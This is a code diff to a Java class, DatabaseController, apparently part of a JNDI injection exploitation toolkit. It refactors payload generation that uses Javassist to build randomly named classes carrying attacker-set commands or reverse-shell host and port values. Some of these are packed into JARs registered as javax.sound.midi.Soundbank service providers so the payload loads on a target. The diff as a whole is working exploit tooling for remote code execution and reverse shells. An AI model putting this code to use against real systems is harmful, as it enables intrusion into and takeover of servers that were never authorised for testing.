@@ -8,10 +8,9 @@ import map.jndi.annotation.JNDIMapping;
 import map.jndi.payload.GroovyPayload;
 import map.jndi.payload.SpringXmlPayload;
 import map.jndi.server.WebServer;
-import map.jndi.template.DerbyJarTemplate;
-import map.jndi.template.ReverseShellTemplate;
-import map.jndi.template.SoundbankCmd;
-import map.jndi.template.SoundbankReverseShell;
+import map.jndi.template.Command;
+import map.jndi.template.DerbyTool;
+import map.jndi.template.ReverseShell;
 import map.jndi.util.JarUtil;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
@@ -99,7 +98,7 @@ public abstract class DatabaseController implements Controller {
 
         String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
+        CtClass clazz = pool.get(ReverseShell.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
 
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
@@ -216,8 +215,10 @@ public abstract class DatabaseController implements Controller {
         String className = MiscUtil.getRandStr(12);
 
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(SoundbankCmd.class.getName());
+        CtClass clazz = pool.get(Command.class.getName());
+        CtClass superClazz = pool.get("javax.sound.midi.Soundbank");
         clazz.replaceClassName(clazz.getName(), className);
+        clazz.setInterfaces(new CtClass[]{superClazz});
         ReflectUtil.setCtField(clazz, "cmd", CtField.Initializer.constant(cmd));
 
         byte[] jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
@@ -254,8 +255,10 @@ public abstract class DatabaseController implements Controller {
         String className = MiscUtil.getRandStr(12);
 
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(SoundbankReverseShell.class.getName());
+        CtClass clazz = pool.get(ReverseShell.class.getName());
+        CtClass superClazz = pool.get("javax.sound.midi.Soundbank");
         clazz.replaceClassName(clazz.getName(), className);
+        clazz.setInterfaces(new CtClass[]{superClazz});
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
 
@@ -322,7 +325,7 @@ public abstract class DatabaseController implements Controller {
 
         String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
+        CtClass clazz = pool.get(ReverseShell.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
 
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
@@ -403,7 +406,7 @@ public abstract class DatabaseController implements Controller {
 
         String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(DerbyJarTemplate.class.getName());
+        CtClass clazz = pool.get(DerbyTool.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
 
         byte[] jarBytes = JarUtil.create(className, clazz.toBytecode());
